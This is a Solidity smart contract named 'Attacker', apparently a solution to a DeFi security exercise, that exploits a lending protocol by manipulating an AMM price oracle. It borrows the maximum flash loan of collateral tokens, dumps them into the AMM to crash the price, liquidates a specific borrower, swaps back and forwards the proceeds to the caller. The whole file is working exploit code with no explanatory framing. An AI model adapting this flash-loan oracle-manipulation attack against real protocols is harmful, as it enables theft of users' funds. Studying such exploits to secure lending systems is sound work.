//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../src/CollateralToken.sol";
import "../src/FlashLoan.sol";
import "../src/AMM.sol";
import "../src/Lending.sol";

contract Attacker is IERC3156FlashBorrower {
    FlashLender flashLender;
    CollateralToken token;
    AMM amm;
    Lending lending;
    address borrower;

    constructor(
        FlashLender _flashLender,
        CollateralToken _token,
        AMM _amm,
        Lending _lending,
        address _borrower
    ) payable {
        flashLender = _flashLender;
        token = _token;
        amm = _amm;
        lending = _lending;
        borrower = _borrower;
        token.approve(address(flashLender), type(uint256).max);
    }

    function attack() external {
        flashLender.flashLoan(
            IERC3156FlashBorrower(this),
            address(token),
            flashLender.maxFlashLoan(address(token)),
            ""
        );
        token.approve(address(this), type(uint256).max);
        token.transferFrom(
            address(this),
            address(msg.sender),
            token.balanceOf(address(this))
        );
        (bool ok, ) = address(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(ok);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.transfer(address(amm), amount);
        amm.swapLendTokenForEth(address(this));
        lending.liquidate(borrower);
        amm.swapEthForLendToken{value: address(this).balance}(address(this));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
